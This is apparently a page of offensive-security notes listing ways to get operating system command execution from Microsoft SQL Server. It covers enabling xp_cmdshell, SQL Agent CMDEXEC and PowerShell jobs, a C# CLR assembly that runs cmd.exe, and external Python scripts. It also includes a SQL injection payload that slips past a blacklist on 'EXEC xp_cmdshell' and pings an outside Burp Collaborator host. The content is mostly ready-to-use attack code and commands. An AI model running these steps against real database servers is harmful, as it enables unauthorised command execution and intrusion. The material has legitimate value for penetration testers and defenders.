
# Command execution

### xp_cmdshell

xp_cmdshell is a system extended stored procedure in Microsoft SQL Server that allows users to execute operating system commands directly from within SQL Server. This functionality can be powerful for administrative tasks, but it also poses significant security risks if not properly managed.

Using SQLRecon.exe:
```
.\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
```

From mssql shell:
```
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC master..xp_cmdshell 'whoami'
```

```
# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```

### Using SQL Server Agent Jobs


SQL Server Agent can be used to create and run jobs that execute system commands. This method assumes you have sufficient privileges to create and execute jobs.

**Create a Job:**
```
USE msdb;
GO
EXEC dbo.sp_add_job
    @job_name = N'MyJob';
```

Add a Step to the Job:
```
EXEC sp_add_jobstep
    @job_name = N'MyJob',
    @step_name = N'ExecuteCommand',
    @subsystem = N'CMDEXEC',
    @command = N'cmd.exe /c dir C:\'; -- Example command
```

Schedule and Start the Job:
```
EXEC dbo.sp_add_schedule
    @schedule_name = N'MySchedule',
    @freq_type = 1,  -- One-time execution
    @active_start_time = 233000; -- Start time
EXEC sp_attach_schedule
    @job_name = N'MyJob',
    @schedule_name = N'MySchedule';
EXEC dbo.sp_start_job N'MyJob';
```


## Using SQL CLR (Common Language Runtime)

SQL CLR allows you to run managed code (like C#) within SQL Server. This can be used to create custom functions or procedures that execute system commands.

Enable CLR Integration:
```
sp_configure 'clr enabled', 1;
RECONFIGURE;
```

Create an Assembly and Function:
+Write a C# function to execute the command:
```
using System;
using System.Data;
using System.Data.SqlClient;
using Microsoft.SqlServer.Server;
using System.Diagnostics;

public class SQLCLR
{
    [SqlProcedure]
    public static void ExecCommand(string command)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + command;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        SqlContext.Pipe.Send(proc.StandardOutput.ReadToEnd());
        proc.WaitForExit();
    }
}
```

+Compile the assembly and deploy it to SQL Server:
```
CREATE ASSEMBLY SQLCLR
FROM 'path_to_your_dll'
WITH PERMISSION_SET = UNSAFE;
GO
```

+Create the stored procedure:
```
CREATE PROCEDURE dbo.ExecCommand
    @command NVARCHAR(4000)
AS EXTERNAL NAME SQLCLR.[Namespace].ExecCommand;
GO

```

**Execute the Command:**
```
EXEC dbo.ExecCommand 'dir C:\';
```

### Using OPENROWSET and BCP Utility

The `OPENROWSET` function and BCP (Bulk Copy Program) utility can be combined to execute system commands. This is more of a roundabout way and involves using SQL Server to interact with files and then triggering command execution.

### Using PowerShell via SQL Server Agent

Another effective method is leveraging PowerShell scripts executed via SQL Server Agent. This also requires appropriate privileges.

Create a PowerShell Job:
```
EXEC dbo.sp_add_job
    @job_name = N'PowerShellJob';
EXEC sp_add_jobstep
    @job_name = N'PowerShellJob',
    @step_name = N'ExecutePowerShell',
    @subsystem = N'PowerShell',
    @command = N'Get-Process'; -- Example PowerShell command
EXEC dbo.sp_add_schedule
    @job_name = N'PowerShellJob',
    @schedule_name = N'PowerShellSchedule',
    @freq_type = 1,
    @active_start_time = 233000;
EXEC sp_attach_schedule
    @job_name = N'PowerShellJob',
    @schedule_name = N'PowerShellSchedule';
EXEC dbo.sp_start_job N'PowerShellJob';
```

### Using SQL Server External Scripts

SQL Server 2016 and later support executing external scripts using R or Python.

**Enable External Scripts:**
```
sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```

**Execute a Python Script:**
```
EXEC sp_execute_external_script 
    @language = N'Python',
    @script = N'
    import os
    os.system("dir C:\\")
    ';
```